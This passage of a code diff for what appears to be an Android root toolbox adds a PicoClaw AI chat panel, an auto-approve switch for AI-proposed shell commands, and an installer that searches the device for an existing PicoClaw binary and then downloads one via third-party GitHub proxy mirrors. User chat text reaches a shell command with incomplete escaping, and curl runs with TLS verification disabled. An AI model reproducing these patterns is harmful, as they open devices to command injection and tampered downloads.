+        document.getElementById('ai_pending_container').addEventListener('click', function(e) {
+            var btn = e.target.closest('[data-action]')
+            if (!btn) return
+            e.stopPropagation()
+            var action = btn.getAttribute('data-action')
+            var id = parseInt(btn.getAttribute('data-cmd-id'))
+            if (isNaN(id)) return
+            if (action === 'exec') executeCommand(id)
+            else if (action === 'reject') rejectCommand(id)
+        })
+
+        // AI悬浮按钮显示开关
+        var _fabVisible = true
+        try { _fabVisible = localStorage.getItem('smart_ai_fab_visible') !== '0' } catch(e) {}
+
+        var updateFABVisibility = function() {
+            var fab = document.getElementById('smart_ai_fab')
+            if (!fab) return
+            if (_fabVisible) {
+                fab.style.display = 'flex'
+            } else {
+                fab.style.display = 'none'
+            }
+        }
+
+        document.getElementById('ai_fab_switch').onclick = function() {
+            _fabVisible = !_fabVisible
+            if (_fabVisible) this.classList.add('_on')
+            else this.classList.remove('_on')
+            try { localStorage.setItem('smart_ai_fab_visible', _fabVisible ? '1' : '0') } catch(e) {}
+            updateFABVisibility()
+            aiLog('AI悬浮按钮: ' + (_fabVisible ? '显示' : '隐藏'), 'info')
+        }
+
+        document.getElementById('ai_auto_approve_switch').onclick = function() {
+            _autoApproveSafe = !_autoApproveSafe
+            if (_autoApproveSafe) this.classList.add('_on')
+            else this.classList.remove('_on')
+            try { localStorage.setItem('smart_ai_auto_safe', _autoApproveSafe ? '1' : '0') } catch(e) {}
+            aiLog('自动批准安全命令: ' + (_autoApproveSafe ? '开启' : '关闭'), 'info')
+        }
+
+        // 恢复自动批准开关
+        if (_autoApproveSafe) {
+            var sw = document.getElementById('ai_auto_approve_switch')
+            if (sw) sw.classList.add('_on')
+        }
+
+        // 恢复悬浮按钮显示状态
+        if (!_fabVisible) {
+            var fabSw = document.getElementById('ai_fab_switch')
+            if (fabSw) fabSw.classList.remove('_on')
+            updateFABVisibility()
+        }
+
+        // ============================================================
+        // ===== PicoClaw 聊天集成（小龙虾 AI 助手）=====
+        // ============================================================
+        var _picoclawPath = '/data/picoclaw'
+        var _picoclawBin = _picoclawPath + '/picoclaw'
+        var _picoclawHomeEnv = 'HOME=' + _picoclawPath
+        var _picoclawSslEnv = 'SSL_CERT_DIR=/system/etc/security/cacerts'
+        var _chatHistory = []  // {role: 'user'|'ai', content: string, time: string}
+        var _chatLoading = false
+        var _picoclawInstalled = false   // 是否已安装
+        var _picoclawRunning = false     // 进程是否在运行
+        var _picoclawConfigured = false  // 是否已配置 API（能正常回复）
+
+        // 切换聊天视图：'install' | 'config' | 'chat'
+        var showChatView = function(viewName) {
+            var installView = document.getElementById('chat_setup_install')
+            var configView = document.getElementById('chat_setup_config')
+            var msgBox = document.getElementById('chat_messages')
+            var quickActions = document.getElementById('chat_quick_actions')
+            var inputArea = document.getElementById('chat_input_area')
+            var localTools = document.getElementById('chat_local_tools')
+            var cmdOutput = document.getElementById('chat_cmd_output')
+
+            if (installView) installView.style.display = viewName === 'install' ? 'flex' : 'none'
+            if (configView) configView.style.display = viewName === 'config' ? 'flex' : 'none'
+            if (msgBox) msgBox.style.display = viewName === 'chat' ? 'flex' : 'none'
+            if (quickActions) quickActions.style.display = viewName === 'chat' ? 'flex' : 'none'
+            if (inputArea) inputArea.style.display = viewName === 'chat' ? 'flex' : 'none'
+            if (localTools) localTools.style.display = viewName === 'local' ? 'block' : 'none'
+            if (cmdOutput) cmdOutput.style.display = 'none'  // 切换视图时隐藏输出
+        }
+
+        // 完整检测 PicoClaw 状态（安装 + 运行 + 配置）
+        var checkPicoClawStatus = async function() {
+            try {
+                var _rs = getShell()
+                if (!_rs) {
+                    _picoclawInstalled = false
+                    _picoclawRunning = false
+                    _picoclawConfigured = false
+                    updatePicoClawStatusUI()
+                    showChatView('install')
+                    return
+                }
+                // 1. 检测是否安装
+                var instRes = await _rs('[ -x "' + _picoclawBin + '" ] && echo INSTALLED || echo NOT_INSTALLED', 2000)
+                _picoclawInstalled = (instRes.content || '').indexOf('INSTALLED') >= 0 && (instRes.content || '').indexOf('NOT_INSTALLED') < 0
+
+                if (!_picoclawInstalled) {
+                    _picoclawRunning = false
+                    _picoclawConfigured = false
+                    updatePicoClawStatusUI()
+                    showChatView('install')
+                    return
+                }
+
+                // 2. 检测配置文件是否存在（PicoClaw agent 模式不需要后台进程）
+                var cfgFile = _picoclawPath + '/.picoclaw/config.json'
+                var cfgRes = await _rs('[ -f "' + cfgFile + '" ] && echo HAS_CONFIG || echo NO_CONFIG', 2000)
+                var hasConfig = (cfgRes.content || '').indexOf('HAS_CONFIG') >= 0
+                
+                // 检查进程是否在运行（可选，agent 模式不需要常驻）
+                var runRes = await _rs('pgrep picoclaw 2>/dev/null', 2000)
+                _picoclawRunning = !!(runRes.content && runRes.content.trim())
+
+                // 3. 检测配置是否有效
+                _picoclawConfigured = false
+                if (hasConfig) {
+                    // 读取配置文件验证 API Key 是否存在
+                    try {
+                        var cfgContent = await _rs('cat ' + cfgFile + ' 2>/dev/null', 2000)
+                        var cfgText = cfgContent.content || ''
+                        if (cfgText.indexOf('"api_key"') >= 0 && cfgText.indexOf('sk-') >= 0) {
+                            _picoclawConfigured = true
+                            // 如果有后台进程就显示运行中，否则也认为可用（agent模式）
+                            if (!_picoclawRunning) {
+                                _picoclawRunning = true  // agent 模式随时可用，标记为 true
+                            }
+                        }
+                    } catch(e) {}
+                }
+                
+                // 如果配置了，尝试发一条测试消息确认能用
+                if (_picoclawConfigured) {
+                    try {
+                        var testResult = await sendToPicoClaw('请只回复"OK"')
+                        if (!testResult.success) {
+                            // 测试失败但配置存在，可能是网络或余额问题，仍保留可用状态
+                            _installLog('PicoClaw 测试消息失败: ' + (testResult.error || '未知'))
+                        }
+                    } catch(e) {}
+                }
+
+                // 根据状态决定显示哪个视图
+                if (_picoclawConfigured) {
+                    showChatView('chat')
+                } else {
+                    // 没配置 API 也显示本地工具箱（无需AI就能用）
+                    showChatView('local')
+                }
+            } catch(e) {
+                _picoclawInstalled = false
+                _picoclawRunning = false
+                _picoclawConfigured = false
+                showChatView('install')
+            }
+            updatePicoClawStatusUI()
+        }
+
+        var updatePicoClawStatusUI = function() {
+            var dot = document.getElementById('picoclaw_status_dot')
+            var txt = document.getElementById('picoclaw_status_text')
+            if (!dot || !txt) return
+            if (!_picoclawInstalled) {
+                dot.className = 'chat-status-dot _bad'
+                txt.textContent = '未安装'
+            } else if (!_picoclawConfigured) {
+                dot.className = 'chat-status-dot _bad'
+                txt.textContent = '未配置 API'
+            } else if (!_picoclawRunning) {
+                dot.className = 'chat-status-dot _warn'
+                txt.textContent = '已配置 · 待启动'
+            } else {
+                dot.className = 'chat-status-dot _ok'
+                txt.textContent = '已就绪 · 可用'
+            }
+        }
+
+        // Tab 切换
+        var switchAITab = function(tabName) {
+            var tabs = panel.querySelectorAll('.ai-tab')
+            tabs.forEach(function(t) {
+                if (t.getAttribute('data-tab') === tabName) t.classList.add('_active')
+                else t.classList.remove('_active')
+            })
+            var contents = panel.querySelectorAll('.ai-tab-content')
+            contents.forEach(function(c) { c.classList.remove('_active') })
+            var target = document.getElementById('ai_tab_' + tabName)
+            if (target) target.classList.add('_active')
+
+            // 切到聊天 tab 时刷新状态
+            if (tabName === 'chat') {
+                checkPicoClawStatus()
+                scrollChatToBottom()
+            }
+        }
+
+        // 绑定 Tab 点击
+        panel.querySelectorAll('.ai-tab').forEach(function(tab) {
+            tab.onclick = function() {
+                var name = tab.getAttribute('data-tab')
+                if (name) switchAITab(name)
+            }
+        })
+
+        // 简单的 Markdown 渲染（只处理代码块、行内代码、换行）
+        var renderMarkdownSimple = function(text) {
+            var html = String(text || '')
+            // 转义 HTML
+            html = html.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+            // 代码块 ```
+            html = html.replace(/```([a-z]*)\n?([\s\S]*?)```/gi, function(m, lang, code) {
+                return '<pre><code>' + code.trim() + '</code></pre>'
+            })
+            // 行内代码 `code`
+            html = html.replace(/`([^`]+)`/g, '<code>$1</code>')
+            // 粗体 **text**
+            html = html.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
+            // 换行保留
+            return html
+        }
+
+        // 添加聊天消息
+        var addChatMessage = function(role, content) {
+            var empty = document.getElementById('chat_empty')
+            if (empty) empty.style.display = 'none'
+
+            var msgBox = document.getElementById('chat_messages')
+            if (!msgBox) return
+
+            var now = new Date()
+            var timeStr = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0')
+
+            var msgDiv = document.createElement('div')
+            msgDiv.className = 'chat-msg _' + role
+            msgDiv.innerHTML =
+                '<div class="chat-avatar">' + (role === 'user' ? '👤' : '🦞') + '</div>' +
+                '<div class="chat-bubble">' + renderMarkdownSimple(content) + '</div>'
+            msgBox.appendChild(msgDiv)
+
+            _chatHistory.push({ role: role, content: content, time: timeStr })
+            if (_chatHistory.length > 100) _chatHistory.shift()
+
+            scrollChatToBottom()
+        }
+
+        var scrollChatToBottom = function() {
+            var msgBox = document.getElementById('chat_messages')
+            if (msgBox) msgBox.scrollTop = msgBox.scrollHeight
+        }
+
+        // 显示"正在思考"状态
+        var showTypingIndicator = function() {
+            var msgBox = document.getElementById('chat_messages')
+            if (!msgBox) return
+            var typing = document.createElement('div')
+            typing.id = 'chat_typing'
+            typing.className = 'chat-msg _ai'
+            typing.innerHTML =
+                '<div class="chat-avatar">🦞</div>' +
+                '<div class="chat-bubble"><span class="chat-typing">正在思考...</span></div>'
+            msgBox.appendChild(typing)
+            scrollChatToBottom()
+        }
+
+        var removeTypingIndicator = function() {
+            var t = document.getElementById('chat_typing')
+            if (t) t.remove()
+        }
+
+        // 直接调用 API（备用方案，绕过 PicoClaw 内部 curl 问题）
+        var _callApiDirect = async function(_rs, message) {
+            try {
+                // 读取配置文件获取 API Key 和 base_url
+                var cfgFile = _picoclawPath + '/.picoclaw/config.json'
+                var cfgRes = await _rs('cat ' + cfgFile + ' 2>/dev/null', 2000)
+                var cfgText = cfgRes.content || ''
+                if (!cfgText || cfgText.indexOf('api_key') < 0) {
+                    return { success: false, error: '未找到 API 配置' }
+                }
+                
+                var apiKey = ''
+                var baseUrl = 'https://api.deepseek.com/v1/chat/completions'
+                var model = 'deepseek-chat'
+                
+                try {
+                    var cfg = JSON.parse(cfgText)
+                    if (cfg.llm && cfg.llm.providers && cfg.llm.providers.default) {
+                        var prov = cfg.llm.providers.default
+                        apiKey = prov.api_key || ''
+                        if (prov.base_url) {
+                            baseUrl = prov.base_url.replace(/\/$/, '') + '/chat/completions'
+                        }
+                        if (prov.default_model) {
+                            model = prov.default_model
+                        }
+                    }
+                } catch(e) {
+                    // JSON 解析失败，用 grep 提取
+                    var keyMatch = cfgText.match(/"api_key"\s*:\s*"([^"]+)"/)
+                    if (keyMatch) apiKey = keyMatch[1]
+                    var urlMatch = cfgText.match(/"base_url"\s*:\s*"([^"]+)"/)
+                    if (urlMatch) baseUrl = urlMatch[1].replace(/\/$/, '') + '/chat/completions'
+                }
+                
+                if (!apiKey) return { success: false, error: '未找到 API Key' }
+                
+                // 构造请求体
+                var body = JSON.stringify({
+                    model: model,
+                    messages: [
+                        { role: 'system', content: '你是一个有帮助的AI助手。' },
+                        { role: 'user', content: message }
+                    ],
+                    max_tokens: 2000,
+                    temperature: 0.7
+                })
+                
+                // 转义 body 里的单引号
+                var escapedBody = body.replace(/'/g, "'\\''")
+                
+                // 用 timeout + curl 调用
+                var cmd = "timeout 60 curl -s -k " +
+                    "-X POST '" + baseUrl + "' " +
+                    "-H 'Content-Type: application/json' " +
+                    "-H 'Authorization: Bearer " + apiKey + "' " +
+                    "-d '" + escapedBody + "' 2>&1"
+                
+                var res = await _rs(cmd, 70000)
+                var output = (res && res.content) || ''
+                
+                // 解析响应
+                if (!output || output.trim().length === 0) {
+                    return { success: false, error: 'API 返回为空' }
+                }
+                
+                try {
+                    var data = JSON.parse(output)
+                    if (data.choices && data.choices[0] && data.choices[0].message) {
+                        var content = data.choices[0].message.content
+                        if (content) {
+                            return { success: true, content: content.trim() }
+                        }
+                    }
+                    if (data.error) {
+                        var errMsg = data.error.message || JSON.stringify(data.error)
+                        // 余额不足
+                        if (errMsg.toLowerCase().indexOf('insufficient') >= 0 || 
+                            errMsg.toLowerCase().indexOf('balance') >= 0 ||
+                            errMsg.toLowerCase().indexOf('quota') >= 0) {
+                            return { success: false, error: 'API 余额不足\n\n💡 推荐免费方案：硅基流动(SiliconFlow)每日有免费额度\n注册地址：https://cloud.siliconflow.cn' }
+                        }
+                        return { success: false, error: 'API错误: ' + errMsg.substring(0, 80) }
+                    }
+                    return { success: false, error: 'API 响应格式异常' }
+                } catch(e) {
+                    // 不是 JSON，检查是不是 curl 错误
+                    if (output.indexOf('curl:') >= 0) {
+                        return { success: false, error: '网络请求失败: ' + output.substring(0, 80) }
+                    }
+                    return { success: false, error: '响应解析失败: ' + output.substring(0, 80) }
+                }
+            } catch(e) {
+                return { success: false, error: '直接调用API失败: ' + String(e).substring(0, 50) }
+            }
+        }
+
+        // 调用 PicoClaw 发送消息
+        var sendToPicoClaw = async function(message) {
+            var _rs = getShell()
+            if (!_rs) return { success: false, error: 'Shell 不可用' }
+            if (!_picoclawInstalled) return { success: false, error: 'PicoClaw 未安装' }
+
+            try {
+                // 转义消息中的特殊字符
+                var escapedMsg = message.replace(/'/g, "'\\''").replace(/"/g, '\\"')
+                var cmd = 'cd ' + _picoclawPath + ' && env ' + _picoclawHomeEnv + ' ' + _picoclawSslEnv + ' ./picoclaw agent -m "' + escapedMsg + '" 2>&1'
+                var res = await _rs(cmd, 60000)  // 60秒超时
+                var output = (res && res.content) || ''
+
+                if (!output || output.trim().length === 0) {
+                    // PicoClaw 返回为空，试试直接调用 API
+                    _installLog('PicoClaw 返回为空，尝试直接调用 API...')
+                    var directResult = await _callApiDirect(_rs, message)
+                    if (directResult.success) {
+                        _installLog('直接调用 API 成功')
+                        return directResult
+                    }
+                    return { success: false, error: 'PicoClaw 返回为空，请检查配置' }
+                }
+
+                // 清理输出：去掉一些不必要的前缀/装饰
+                var cleaned = output.trim()
+                
+                // 检测 PicoClaw 内部 curl 错误，自动回退到直接调用 API
+                var lowerCleaned = cleaned.toLowerCase()
+                var first200 = lowerCleaned.substring(0, 200)
+                var isCurlError = 
+                    lowerCleaned.indexOf('curl:') >= 0 ||
+                    lowerCleaned.indexOf('option -m') >= 0 ||
+                    lowerCleaned.indexOf('option --max-time') >= 0 ||
+                    lowerCleaned.indexOf('option --connect-timeout') >= 0 ||
+                    lowerCleaned.indexOf('could not resolve') >= 0 ||
+                    lowerCleaned.indexOf('connection timed out') >= 0 ||
+                    (lowerCleaned.indexOf('error') >= 0 && lowerCleaned.indexOf('curl') >= 0) ||
+                    lowerCleaned.indexOf('try \'curl --help') >= 0 ||
+                    // 开头就是 curl 错误信息
+                    first200.indexOf('curl ') >= 0 ||
+                    first200.indexOf('bad ') >= 0
+                
+                if (isCurlError) {
+                    _installLog('检测到 PicoClaw 内部 curl 错误，尝试直接调用 API...')
+                    var directRes = await _callApiDirect(_rs, message)
+                    if (directRes.success) {
+                        _installLog('直接调用 API 成功')
+                        return directRes
+                    }
+                    _installLog('直接调用 API 也失败: ' + directRes.error)
+                    // 返回更友好的错误信息
+                    return { success: false, error: directRes.error || ('PicoClaw curl 错误，已尝试备用方案失败') }
+                }
+                
+                // 如果开头就是错误信息（不是正常对话内容）
+                var startsWithError = 
+                    first200.indexOf('error:') === 0 ||
+                    first200.indexOf('fatal') >= 0 ||
+                    first200.indexOf('panic') >= 0 ||
+                    (first200.indexOf('error') >= 0 && first200.length < 200)
+                
+                if (startsWithError) {
+                    _installLog('PicoClaw 返回错误，尝试直接调用 API...')
+                    var directRes2 = await _callApiDirect(_rs, message)
+                    if (directRes2.success) {
+                        _installLog('直接调用 API 成功')
+                        return directRes2
+                    }
+                    return { success: false, error: cleaned.substring(0, 100) }
+                }
+                
+                // 如果有明显的错误信息（但不是 curl 相关）
+                if (cleaned.indexOf('error') >= 0 && cleaned.length < 300 && !isCurlError && !startsWithError) {
+                    return { success: false, error: cleaned }
+                }
+
+                return { success: true, content: cleaned }
+            } catch(e) {
+                // 异常了也试试直接调用 API
+                var _rs2 = getShell()
+                if (_rs2) {
+                    var directRes2 = await _callApiDirect(_rs2, message)
+                    if (directRes2.success) return directRes2
+                }
+                return { success: false, error: String(e) }
+            }
+        }
+
+        // 发送聊天消息
+        var sendChatMessage = async function() {
+            if (_chatLoading) return
+            var input = document.getElementById('chat_input')
+            var text = input ? input.value.trim() : ''
+            if (!text) return
+
+            if (!_picoclawInstalled) {
+                showToast('请先安装 PicoClaw（小龙虾插件）', 'red', 3000)
+                return
+            }
+
+            _chatLoading = true
+            var sendBtn = document.getElementById('chat_send_btn')
+            if (sendBtn) { sendBtn.disabled = true; sendBtn.textContent = '发送中...' }
+
+            // 添加用户消息
+            addChatMessage('user', text)
+            input.value = ''
+            input.style.height = 'auto'
+
+            // 显示思考中
+            showTypingIndicator()
+
+            try {
+                var result = await sendToPicoClaw(text)
+                removeTypingIndicator()
+
+                if (result.success) {
+                    addChatMessage('ai', result.content)
+                } else {
+                    addChatMessage('ai', '❌ 出错了：' + (result.error || '未知错误'))
+                }
+            } catch(e) {
+                removeTypingIndicator()
+                addChatMessage('ai', '❌ 异常：' + String(e))
+            } finally {
+                _chatLoading = false
+                if (sendBtn) { sendBtn.disabled = false; sendBtn.textContent = '发送' }
+                input.focus()
+            }
+        }
+
+        // 聊天输入框事件
+        var chatInput = document.getElementById('chat_input')
+        if (chatInput) {
+            chatInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter' && !e.shiftKey) {
+                    e.preventDefault()
+                    sendChatMessage()
+                }
+            })
+            // 自动调整高度
+            chatInput.addEventListener('input', function() {
+                this.style.height = 'auto'
+                this.style.height = Math.min(this.scrollHeight, 120) + 'px'
+            })
+        }
+
+        // 发送按钮
+        var chatSendBtn = document.getElementById('chat_send_btn')
+        if (chatSendBtn) chatSendBtn.onclick = sendChatMessage
+
+        // 快捷问题按钮
+        var quickBtns = document.querySelectorAll('.chat-quick-btn')
+        quickBtns.forEach(function(btn) {
+            btn.onclick = function() {
+                var q = btn.getAttribute('data-q')
+                if (q) {
+                    var input = document.getElementById('chat_input')
+                    if (input) { input.value = q; sendChatMessage() }
+                }
+            }
+        })
+
+        // 本地工具箱按钮
+        var localBtns = document.querySelectorAll('.chat-local-btn')
+        localBtns.forEach(function(btn) {
+            btn.onclick = async function() {
+                var cmd = btn.getAttribute('data-cmd')
+                if (!cmd) return
+                
+                // 跳转到配置页的按钮
+                if (btn.id === 'local_goto_config_btn') {
+                    showChatView('config')
+                    return
+                }
+                
+                var _rs = getShell()
+                if (!_rs) {
+                    showToast('Shell 不可用', 'red', 2000)
+                    return
+                }
+                
+                var outputEl = document.getElementById('chat_cmd_output')
+                if (outputEl) {
+                    outputEl.style.display = 'block'
+                    outputEl.textContent = '⏳ 执行中...'
+                }
+                
+                btn.disabled = true
+                var origText = btn.textContent
+                btn.textContent = '执行中...'
+                
+                try {
+                    var result = await _rs(cmd, 10000)
+                    var output = (result && result.content) || '无输出'
+                    if (outputEl) {
+                        outputEl.textContent = '📌 执行结果:\n\n' + output
+                        outputEl.scrollTop = 0
+                    }
+                } catch(e) {
+                    if (outputEl) {
+                        outputEl.textContent = '❌ 执行失败: ' + String(e)
+                    }
+                } finally {
+                    btn.disabled = false
+                    btn.textContent = origText
+                }
+            }
+        })
+
+        // 打开 PicoClaw 面板
+        var openPanelBtn = document.getElementById('picoclaw_open_panel')
+        if (openPanelBtn) {
+            openPanelBtn.onclick = function() {
+                if (_picoclawConfigured) {
+                    // 配置了就显示聊天
+                    showChatView('chat')
+                } else if (_picoclawInstalled) {
+                    // 安装了但没配置，显示本地工具箱
+                    showChatView('local')
+                } else {
+                    // 没安装显示安装页
+                    showChatView('install')
+                }
+            }
+        }
+
+        // 打开 PicoClaw 面板的通用函数（兼容旧调用）
+        var openPicoClawPanel = function() {
+            if (_picoclawConfigured) {
+                showChatView('chat')
+            } else if (_picoclawInstalled) {
+                showChatView('local')
+            } else {
+                showChatView('install')
+            }
+        }
+
+        // ===== PicoClaw 一键安装 =====
+        var _installSleep = function(ms) { return new Promise(function(r) { setTimeout(r, ms) }) }
+        var _installLog = function(msg) {
+            var logEl = document.getElementById('pc_install_log')
+            if (logEl) logEl.textContent = msg
+            aiLog('[PicoClaw安装] ' + msg, 'info')
+        }
+        var _setInstallProgress = function(pct, statusText) {
+            var fill = document.getElementById('pc_progress_fill')
+            var status = document.getElementById('pc_install_status')
+            if (fill) fill.style.width = pct + '%'
+            if (status && statusText) status.textContent = statusText
+        }
+
+        // 从 APK/APP 提取 PicoClaw 二进制（全面搜索）
+        var _extractFromApk = async function(_rs) {
+            _installLog('正在搜索系统中的 PicoClaw...')
+
+            // 第0步（最靠谱）：从正在运行的进程找 exe 路径
+            try {
+                var pgrepRes0 = await _rs('ps -ef 2>/dev/null | grep -i picoclaw | grep -v grep | head -5', 2000)
+                _installLog('进程列表: ' + (pgrepRes0.content || '').replace(/\n/g, ' | ').substring(0, 120))
+
+                var pgrepPid = await _rs('pgrep -f "picoclaw" 2>/dev/null | head -5', 2000)
+                var pids0 = (pgrepPid.content || '').trim().split('\n')
+                for (var p0 = 0; p0 < pids0.length; p0++) {
+                    var pid0 = pids0[p0].trim()
+                    if (!pid0) continue
+                    var exe0 = await _rs('ls -l /proc/' + pid0 + '/exe 2>/dev/null; cat /proc/' + pid0 + '/cmdline 2>/dev/null | tr "\\0" " " | head -c 200', 1000)
+                    var exeOut0 = exe0.content || ''
+                    _installLog('进程 ' + pid0 + ': ' + exeOut0.replace(/\n/g, ' ').substring(0, 100))
+                    if (exeOut0.indexOf('->') >= 0) {
+                        var idx0 = exeOut0.indexOf('->') + 2
+                        var endIdx0 = exeOut0.indexOf('\n')
+                        var path0 = exeOut0.substring(idx0, endIdx0 > idx0 ? endIdx0 : idx0 + 200).trim()
+                        if (path0 && path0.length > 5) {
+                            _installLog('从进程找到二进制: ' + path0)
+                            return path0
+                        }
+                    }
+                }
+            } catch(e) {}
+
+            // 第一步：用 pm 列出所有包，找含 picoclaw/claw/小龙虾/xingyue 的包
+            var pkgPaths = []
+            try {
+                var pmRes = await _rs('pm list packages -f 2>/dev/null | grep -iE "picoclaw|claw|xiaolong|lobster" | head -10', 3000)
+                var pmLines = (pmRes.content || '').trim().split('\n')
+                for (var pi = 0; pi < pmLines.length; pi++) {
+                    var line = pmLines[pi].trim()
+                    if (!line) continue
+                    // pm list packages -f 格式: package:/data/app/xxx/base.apk=com.xxx
+                    var eqIdx = line.lastIndexOf('=')
+                    var pkgIdx = line.indexOf('package:')
+                    if (eqIdx > 0 && pkgIdx >= 0) {
+                        var apkPath = line.substring(8, eqIdx)
+                        var pkgName = line.substring(eqIdx + 1)
+                        pkgPaths.push({ apk: apkPath, pkg: pkgName })
+                        _installLog('找到包: ' + pkgName)
+                    }
+                }
+            } catch(e) {}
+
+            // 第二步：从找到的包中提取 lib 目录
+            for (var pki = 0; pki < pkgPaths.length; pki++) {
+                var pkgInfo = pkgPaths[pki]
+                try {
+                    // 找 native library 目录
+                    var libDir = '/data/app/' + pkgInfo.pkg + '-*/lib/*/'
+                    var libFindCmd = 'for d in ' + libDir + '; do [ -d "$d" ] && echo "LIBDIR:$d" && ls "$d" | head -10 && break; done 2>/dev/null'
+                    var libRes = await _rs(libFindCmd, 2000)
+                    var libOut = libRes.content || ''
+                    if (libOut.indexOf('LIBDIR:') >= 0) {
+                        _installLog('找到 lib 目录: ' + libOut.substring(libOut.indexOf('LIBDIR:') + 7).trim().split('\n')[0])
+                    }
+
+                    // 找可能的 picoclaw 二进制（so 文件）
+                    var soFindCmd = 'find /data/app/' + pkgInfo.pkg + '* -name "*.so" -type f 2>/dev/null | xargs -I{} ls -la {} 2>/dev/null | sort -k5 -n -r | head -5'
+                    var soRes = await _rs(soFindCmd, 3000)
+                    var soOut = soRes.content || ''
+                    _installLog('搜索 so 文件: ' + soOut.substring(0, 100))
+
+                    // 找最大的 so 文件（可能是 picoclaw）
+                    var bigSoCmd = 'find /data/app/' + pkgInfo.pkg + '* -name "*.so" -type f -exec ls -l {} \\; 2>/dev/null | awk "{print \\$5, \\$9}" | sort -n -r | head -3'
+                    var bigSoRes = await _rs(bigSoCmd, 3000)
+                    var bigSoOut = bigSoRes.content || ''
+                    var bigSoLines = bigSoOut.trim().split('\n')
+                    for (var bi = 0; bi < bigSoLines.length; bi++) {
+                        var parts = bigSoLines[bi].trim().split(' ')
+                        if (parts.length >= 2) {
+                            var size = parseInt(parts[0]) || 0
+                            var path = parts[1]
+                            if (size > 5000000) {  // 大于 5MB 的 so 很可能是 picoclaw
+                                _installLog('找到大文件 (' + (size/1024/1024).toFixed(1) + 'MB): ' + path)
+                                return path
+                            }
+                        }
+                    }
+                } catch(e) {}
+            }
+
+            // 第三步：全局搜索 picoclaw 相关文件
+            try {
+                var globalFind = 'find /data -maxdepth 6 -type f \\( -name "picoclaw" -o -name "*picoclaw*" -o -name "*pico_claw*" \\) 2>/dev/null | head -10'
+                var gRes = await _rs(globalFind, 5000)
+                var gOut = gRes.content || ''
+                var gLines = gOut.trim().split('\n')
+                for (var gi = 0; gi < gLines.length; gi++) {
+                    var gPath = gLines[gi].trim()
+                    if (gPath) {
+                        _installLog('找到文件: ' + gPath)
+                        // 检查是否是可执行文件
+                        var chkRes = await _rs('file ' + gPath + ' 2>/dev/null || echo UNKNOWN', 1000)
+                        if ((chkRes.content || '').indexOf('ELF') >= 0) {
+                            return gPath
+                        }
+                    }
+                }
+            } catch(e) {}
+
+            // 第四步：搜索 pgrep 找到的进程的可执行文件路径
+            try {
+                var pgrepRes = await _rs('pgrep -f picoclaw 2>/dev/null | head -3', 1000)
+                var pids = (pgrepRes.content || '').trim().split('\n')
+                for (var pidi = 0; pidi < pids.length; pidi++) {
+                    var pid = pids[pidi].trim()
+                    if (!pid) continue
+                    var exeRes = await _rs('ls -l /proc/' + pid + '/exe 2>/dev/null || echo NOPATH', 1000)
+                    var exeOut = exeRes.content || ''
+                    if (exeOut.indexOf('->') >= 0) {
+                        var exePath = exeOut.substring(exeOut.indexOf('->') + 2).trim()
+                        _installLog('从进程找到: ' + exePath)
+                        return exePath
+                    }
+                }
+            } catch(e) {}
+
+            // 第五步：常用路径兜底（扩大搜索范围）
+            var fallbackPaths = [
+                '/data/data/com.xingyue.toolbate/files/picoclaw',
+                '/data/data/com.xingyue.toolbate/app_picoclaw/picoclaw',
+                '/data/data/com.xingyue.toolbate/*/picoclaw',
+                '/data/user/0/com.xingyue.toolbate/files/picoclaw',
+                '/data/picoclaw/picoclaw',
+                '/data/local/picoclaw/picoclaw',
+                '/data/local/tmp/picoclaw/picoclaw',
+                '/sdcard/picoclaw/picoclaw',
+                '/sdcard/Download/picoclaw',
+                '/storage/emulated/0/picoclaw/picoclaw'
+            ]
+            for (var fi = 0; fi < fallbackPaths.length; fi++) {
+                try {
+                    var fcmd = 'for f in ' + fallbackPaths[fi] + '; do [ -f "$f" ] && echo "FOUND:$f" && break; done 2>/dev/null'
+                    var fres = await _rs(fcmd, 1000)
+                    if ((fres.content || '').indexOf('FOUND:') >= 0) {
+                        var fpath = fres.content.substring(fres.content.indexOf('FOUND:') + 6).trim().split('\n')[0].trim()
+                        if (fpath) {
+                            _installLog('兜底找到: ' + fpath)
+                            return fpath
+                        }
+                    }
+                } catch(e) {}
+            }
+
+            _installLog('未在系统中找到 PicoClaw 二进制')
+            return null
+        }
+
+        // 从网络下载 PicoClaw（带进度显示，优先国内镜像）
+        var _downloadPicoClaw = async function(_rs) {
+            var tmpFile = '/data/local/tmp/picoclaw.tar.gz'
+
+            _installLog('正在下载 PicoClaw...')
+            _setInstallProgress(15, '下载中 0%')
+
+            // 先测试网络连通性
+            var netOk = false
+            try {
+                var pingRes = await _rs('getprop net.dns1 2>/dev/null; echo ---; ping -c 1 -W 2 223.5.5.5 2>&1 | head -2', 5000)
+                _installLog('网络检测: ' + (pingRes.content || '').replace(/\n/g, ' ').substring(0, 80))
+                // 尝试用 IP 直连测试
+                var ipTest = await _rs('curl -s --connect-timeout 5 --max-time 8 -o /dev/null -w "%{http_code}" "http://223.5.5.5/" 2>/dev/null || echo "000"', 10000)
+                if ((ipTest.content || '').trim() !== '000') {
+                    netOk = true
+                }
+            } catch(e) {}
+
+            // 如果网络不通，尝试临时设置 DNS
+            if (!netOk) {
+                _installLog('网络可能有问题，尝试设置 DNS...')
+                await _rs('setprop net.dns1 223.5.5.5 2>/dev/null; setprop net.dns2 8.8.8.8 2>/dev/null', 1000)
+                await _installSleep(1000)
+            }
+
+            // 下载源列表（按优先级，国内镜像优先）
+            var downloadUrls = [
+                // 国内镜像优先
+                { name: '国内镜像1', url: 'https://mirror.ghproxy.com/https://github.com/sipeed/picoclaw/releases/latest/download/picoclaw_Linux_arm64.tar.gz' },
+                { name: '国内镜像2', url: 'https://gh-proxy.com/https://github.com/sipeed/picoclaw/releases/latest/download/picoclaw_Linux_arm64.tar.gz' },
+                { name: '国内镜像3', url: 'https://gh.api.99988866.xyz/https://github.com/sipeed/picoclaw/releases/latest/download/picoclaw_Linux_arm64.tar.gz' },
+                // GitHub 直连（备用）
+                { name: 'GitHub直连', url: 'https://github.com/sipeed/picoclaw/releases/latest/download/picoclaw_Linux_arm64.tar.gz' }
+            ]
+
+            // 检测 curl 是否支持 -# 进度条
+            var curlAvailable = false
+            var curlCheck = await _rs('which curl 2>/dev/null && echo HAS_CURL || echo NO_CURL', 1000)
+            curlAvailable = (curlCheck.content || '').indexOf('HAS_CURL') >= 0
+
+            var downloaded = false
+            for (var ui = 0; ui < downloadUrls.length; ui++) {
